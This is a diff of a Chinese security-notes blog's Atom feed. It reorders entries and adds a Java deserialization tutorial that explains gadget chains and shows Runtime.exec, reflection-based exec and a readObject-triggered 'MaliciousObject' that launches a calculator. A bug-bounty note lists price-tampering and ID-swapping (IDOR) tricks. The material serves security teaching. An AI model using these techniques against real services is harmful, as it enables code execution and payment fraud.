@@ -3,13 +3,13 @@
   <id>https://echo0d.github.io/DailyNotes/</id>
   <title>echo0d-notes</title>
   <subtitle>echo0d-notes-vuepress</subtitle>
-  <updated>2025-12-23T10:10:10.797Z</updated>
+  <updated>2025-12-31T06:51:10.779Z</updated>
   <generator>@vuepress/plugin-feed</generator>
   <link rel="self" href="https://echo0d.github.io/DailyNotes/atom.xml"/>
   <link rel="alternate" href="https://echo0d.github.io/DailyNotes/"/>
   <category term="CyberSecurity"/>
-  <category term="代码审计"/>
   <category term="网络安全"/>
+  <category term="代码审计"/>
   <category term="C++"/>
   <category term="C"/>
   <category term="Java"/>
@@ -20,48 +20,6 @@
   <category term="Go"/>
   <category term="Python"/>
   <category term="日常备忘"/>
-  <entry>
-    <title type="text">CTF - DeserBug</title>
-    <id>https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/CTFDeserBug.html</id>
-    <link href="https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/CTFDeserBug.html"/>
-    <updated>2025-12-23T10:09:20.000Z</updated>
-    <summary type="html"><![CDATA[
-<h2>目录</h2>
-<ul>
-<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
-<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
-<li><a href="#cc%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">CC链基础知识</a>
-<ul>
-<li><a href="#cc1%E9%93%BE%E5%8E%9F%E7%90%86">CC1链原理</a></li>
-<li><a href="#cc3%E9%93%BE%E5%8E%9F%E7%90%86">CC3链原理</a></li>
-<li><a href="#cc6%E9%93%BE%E5%8E%9F%E7%90%86">CC6链原理</a></li>
-</ul>
-</li>
-<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</a></li>
-<li><a href="#%E5%AE%8C%E6%95%B4poc%E5%AE%9E%E7%8E%B0">完整POC实现</a></li>
-<li><a href="#%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90">关键机制解析</a></li>
-<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8B%BC%E6%8E%A5%E5%8E%9F%E7%90%86">反序列化链拼接原理</a></li>
-</ul>]]></summary>
-    <content type="html"><![CDATA[
-<h2>目录</h2>
-<ul>
-<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
-<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
-<li><a href="#cc%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">CC链基础知识</a>
-<ul>
-<li><a href="#cc1%E9%93%BE%E5%8E%9F%E7%90%86">CC1链原理</a></li>
-<li><a href="#cc3%E9%93%BE%E5%8E%9F%E7%90%86">CC3链原理</a></li>
-<li><a href="#cc6%E9%93%BE%E5%8E%9F%E7%90%86">CC6链原理</a></li>
-</ul>
-</li>
-<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</a></li>
-<li><a href="#%E5%AE%8C%E6%95%B4poc%E5%AE%9E%E7%8E%B0">完整POC实现</a></li>
-<li><a href="#%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90">关键机制解析</a></li>
-<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8B%BC%E6%8E%A5%E5%8E%9F%E7%90%86">反序列化链拼接原理</a></li>
-</ul>
-]]></content>
-    <published>2025-12-17T15:25:28.000Z</published>
-  </entry>
   <entry>
     <title type="text">代码混淆 (Code Obfuscation)</title>
     <id>https://echo0d.github.io/DailyNotes/CyberSecurity/ReverseEngineering/CodeObfuscation.html</id>
@@ -353,6 +311,48 @@
     <summary type="html"><![CDATA[
 ]]></summary>
     <content type="html"><![CDATA[
+]]></content>
+    <published>2025-12-17T15:25:28.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">一道CTF题(DeserBug)引发的Java反序列化链拼接方法思考</title>
+    <id>https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/CTFDeserBug.html</id>
+    <link href="https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/CTFDeserBug.html"/>
+    <updated>2025-12-31T06:50:15.000Z</updated>
+    <summary type="html"><![CDATA[
+<h2>目录</h2>
+<ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#cc%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">CC链基础知识</a>
+<ul>
+<li><a href="#cc1%E9%93%BE%E5%8E%9F%E7%90%86">CC1链原理</a></li>
+<li><a href="#cc3%E9%93%BE%E5%8E%9F%E7%90%86">CC3链原理</a></li>
+<li><a href="#cc6%E9%93%BE%E5%8E%9F%E7%90%86">CC6链原理</a></li>
+</ul>
+</li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4poc%E5%AE%9E%E7%8E%B0">完整POC实现</a></li>
+<li><a href="#%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90">关键机制解析</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8B%BC%E6%8E%A5%E5%8E%9F%E7%90%86">反序列化链拼接原理</a></li>
+</ul>]]></summary>
+    <content type="html"><![CDATA[
+<h2>目录</h2>
+<ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#cc%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">CC链基础知识</a>
+<ul>
+<li><a href="#cc1%E9%93%BE%E5%8E%9F%E7%90%86">CC1链原理</a></li>
+<li><a href="#cc3%E9%93%BE%E5%8E%9F%E7%90%86">CC3链原理</a></li>
+<li><a href="#cc6%E9%93%BE%E5%8E%9F%E7%90%86">CC6链原理</a></li>
+</ul>
+</li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4poc%E5%AE%9E%E7%8E%B0">完整POC实现</a></li>
+<li><a href="#%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90">关键机制解析</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8B%BC%E6%8E%A5%E5%8E%9F%E7%90%86">反序列化链拼接原理</a></li>
+</ul>
 ]]></content>
     <published>2025-12-17T15:25:28.000Z</published>
   </entry>
@@ -953,6 +953,43 @@ Can-Redefine-Classes: true
     <published>2025-09-30T03:31:48.000Z</published>
   </entry>
   <entry>
+    <title type="text">src学习记录</title>
+    <id>https://echo0d.github.io/DailyNotes/CyberSecurity/SRC/SrcNote.html</id>
+    <link href="https://echo0d.github.io/DailyNotes/CyberSecurity/SRC/SrcNote.html"/>
+    <updated>2025-08-26T10:04:55.000Z</updated>
+    <summary type="html"><![CDATA[
+<h2>1 工具</h2>
+<p>fiddler使用，这里不记录了</p>
+<h2>2 int类型最大值</h2>
+<p>在32位系统中，<code>int</code>&nbsp;类型的取值范围是从 -2,147,483,648 到 2,147,483,647</p>
+<p>涉及到支付时候，0-2,147,483,647，那么有可能 2,147,483,648=0</p>
+<p>四舍五入：充值0.0016到账0.02</p>
+<ul>
+<li>常见参数price，可以把金额改成负数等</li>
+<li>常见参数num,数量也可以用上面的方法修改</li>
+<li>常见参数id，比如userId, productId, addressId</li>
+</ul>]]></summary>
+    <content type="html"><![CDATA[
+<h2>1 工具</h2>
+<p>fiddler使用，这里不记录了</p>
+<h2>2 int类型最大值</h2>
+<p>在32位系统中，<code>int</code>&nbsp;类型的取值范围是从 -2,147,483,648 到 2,147,483,647</p>
+<p>涉及到支付时候，0-2,147,483,647，那么有可能 2,147,483,648=0</p>
+<p>四舍五入：充值0.0016到账0.02</p>
+<ul>
+<li>常见参数price，可以把金额改成负数等</li>
+<li>常见参数num,数量也可以用上面的方法修改</li>
+<li>常见参数id，比如userId, productId, addressId</li>
+</ul>
+<h2>越权、并发、支付</h2>
+<p>越权登录：登录账号时把UID改成别人的
+别人填写的收货地址，我在查询地址时候把地址ID改掉，导致查到别人的地址</p>
+<p>并发</p>
+]]></content>
+    <category term="网络安全"/>
+    <published>2025-08-26T10:04:55.000Z</published>
+  </entry>
+  <entry>
     <title type="text">PHP基础</title>
     <id>https://echo0d.github.io/DailyNotes/CodeAudittutorial/5-PHP/1-PHPBase.html</id>
     <link href="https://echo0d.github.io/DailyNotes/CodeAudittutorial/5-PHP/1-PHPBase.html"/>
@@ -1053,43 +1090,6 @@ APP_DEBUG = true
 </code></pre>
 ]]></content>
     <category term="代码审计"/>
-    <published>2025-08-26T10:04:55.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">src学习记录</title>
-    <id>https://echo0d.github.io/DailyNotes/CyberSecurity/SRC/SrcNote.html</id>
-    <link href="https://echo0d.github.io/DailyNotes/CyberSecurity/SRC/SrcNote.html"/>
-    <updated>2025-08-26T10:04:55.000Z</updated>
-    <summary type="html"><![CDATA[
-<h2>1 工具</h2>
-<p>fiddler使用，这里不记录了</p>
-<h2>2 int类型最大值</h2>
-<p>在32位系统中，<code>int</code>&nbsp;类型的取值范围是从 -2,147,483,648 到 2,147,483,647</p>
-<p>涉及到支付时候，0-2,147,483,647，那么有可能 2,147,483,648=0</p>
-<p>四舍五入：充值0.0016到账0.02</p>
-<ul>
-<li>常见参数price，可以把金额改成负数等</li>
-<li>常见参数num,数量也可以用上面的方法修改</li>
-<li>常见参数id，比如userId, productId, addressId</li>
-</ul>]]></summary>
-    <content type="html"><![CDATA[
-<h2>1 工具</h2>
-<p>fiddler使用，这里不记录了</p>
-<h2>2 int类型最大值</h2>
-<p>在32位系统中，<code>int</code>&nbsp;类型的取值范围是从 -2,147,483,648 到 2,147,483,647</p>
-<p>涉及到支付时候，0-2,147,483,647，那么有可能 2,147,483,648=0</p>
-<p>四舍五入：充值0.0016到账0.02</p>
-<ul>
-<li>常见参数price，可以把金额改成负数等</li>
-<li>常见参数num,数量也可以用上面的方法修改</li>
-<li>常见参数id，比如userId, productId, addressId</li>
-</ul>
-<h2>越权、并发、支付</h2>
-<p>越权登录：登录账号时把UID改成别人的
-别人填写的收货地址，我在查询地址时候把地址ID改掉，导致查到别人的地址</p>
-<p>并发</p>
-]]></content>
-    <category term="网络安全"/>
     <published>2025-08-26T10:04:55.000Z</published>
   </entry>
   <entry>
@@ -21080,7 +21080,7 @@ runtime.main (proc.go:250) runtime
     <title type="text">反序列化漏洞详解</title>
     <id>https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/deserialize.html</id>
     <link href="https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/deserialize.html"/>
-    <updated>2025-06-04T09:27:16.000Z</updated>
+    <updated>2025-12-31T06:50:15.000Z</updated>
     <summary type="html"><![CDATA[
 <p>这里记录反序列化漏洞原理(Java 为主)，分析了 DNSURL 链。</p>
 ]]></summary>
@@ -21218,6 +21218,232 @@ runtime.main (proc.go:250) runtime
 <li>
 <p>具有继承性,父类可以序列化那么子类同样可以（递归）</p>
 </li>
+</ul>
+<h3>为什么会产生安全问题？</h3>
+<p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p>
+<p><strong>可能的形式</strong></p>
+<ol>
+<li>
+<p>入口类的readObject直接调用危险方法。</p>
+</li>
+<li>
+<p>入口类参数中包含可控类，该类有危险方法，readObject时调用，比如类型定义为Object，调用equals/hashcode/toString。</p>
+</li>
+<li>
+<p>入口类参数中包含可控类，该类又调用其他有危险方法的类，重点 相同类型 同名函数</p>
+</li>
+<li>
+<p>构造函数/静态代码块等类加载时隐式执行。</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>共同条件 继承Serializable</p>
+</li>
+<li>
+<p>入口类 source（重写readObject 参数类型宽泛 最好jdk自带，最好的例子就是HashMap）</p>
+</li>
+<li>
+<p>调用链 gadget chain</p>
+</li>
+<li>
+<p>执行类 sink （rce ssrf 写文件等等）</p>
+</li>
+</ul>
+<h3>Java 反序列化执行系统命令</h3>
+<p>在Java反序列化漏洞中，最终目标往往是执行系统命令。下面介绍三种执行系统命令的方式：</p>
+<h4>1. 正常执行系统命令</h4>
+<p>最直接的方式是使用<code>Runtime.getRuntime().exec()</code>方法：</p>
+<pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NormalExec</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token comment">// 直接调用Runtime执行命令</span>
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+            <span class="token comment">// 或者执行更复杂的命令</span>
+            <span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+            <span class="token comment">// 读取命令输出</span>
+            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span>
+                <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">String</span> line<span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><strong>特点：</strong></p>
+<ul>
+<li>简单直接，无需额外配置</li>
+<li>但在实际漏洞利用中，往往无法直接调用<code>Runtime</code>对象</li>
+<li><code>Runtime</code>类没有实现<code>Serializable</code>接口，无法被序列化</li>
+</ul>
+<h4>2. 反射执行系统命令</h4>
+<p>使用Java反射机制可以绕过一些限制，动态调用<code>Runtime</code>类的方法：</p>
+<p><strong>方式1：使用<code>Class.forName()</code>完整的反射调用链</strong></p>
+<pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionExec1</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token comment">// 通过Class.forName获取Runtime类</span>
+            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> runtimeClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 获取getRuntime方法</span>
+            <span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 调用getRuntime方法获取Runtime实例</span>
+            <span class="token class-name">Object</span> runtime <span class="token operator">=</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 获取exec方法</span>
+            <span class="token class-name">Method</span> execMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 调用exec方法执行命令</span>
+            execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><strong>方式2：使用<code>Runtime.class</code>直接获取类对象</strong></p>
+<pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionExec2</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token comment">// 直接使用Runtime.class获取类对象</span>
+            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> runtimeClass <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
+            <span class="token comment">// 获取getRuntime方法</span>
+            <span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 调用getRuntime方法获取Runtime实例</span>
+            <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 获取exec方法</span>
+            <span class="token class-name">Method</span> execMethod <span class="token operator">=</span> runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 调用exec方法执行命令</span>
+            execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><strong>反射执行的完整链路：</strong></p>
+<pre><code>Runtime.class 
+  → getMethod("getRuntime") 
+  → invoke(null) 
+  → getMethod("exec", String.class) 
+  → invoke(runtime, "calc")
+</code></pre>
+<p><strong>为什么使用Runtime.class而不是Runtime.getRuntime()？</strong></p>
+<ul>
+<li><code>Runtime.getRuntime()</code>返回的是<code>java.lang.Runtime</code>对象，无法序列化</li>
+<li><code>Runtime.class</code>返回的是<code>java.lang.Class</code>对象，实现了<code>Serializable</code>接口，可以被序列化</li>
+</ul>
+<h4>3. 反序列化执行系统命令</h4>
+<p>在反序列化场景中，通过重写<code>readObject()</code>方法，在反序列化时自动执行命令：</p>
+<pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializeExec</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token comment">// 第一步：序列化恶意对象到文件</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"=== 开始序列化 ==="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">MaliciousObject</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MaliciousObject</span><span class="token punctuation">(</span><span class="token string">"open -a claculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"malicious.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"对象已序列化到文件: malicious.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n=== 开始反序列化 ==="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 第二步：从文件中反序列化对象（此时会触发命令执行）</span>
+            <span class="token class-name">MaliciousObject</span> deserializedObj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">MaliciousObject</span><span class="token punctuation">)</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token string">"malicious.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"对象已反序列化，命令已执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"对象属性 name: "</span> <span class="token operator">+</span> deserializedObj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    
+    <span class="token comment">// 序列化方法：将对象写入文件</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fileName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    
+    <span class="token comment">// 反序列化方法：从文件中读取对象</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// 恶意类：必须实现Serializable接口</span>
+<span class="token keyword">class</span> <span class="token class-name">MaliciousObject</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> command<span class="token punctuation">;</span>  <span class="token comment">// 改为command，用于指定要执行的命令</span>
+    
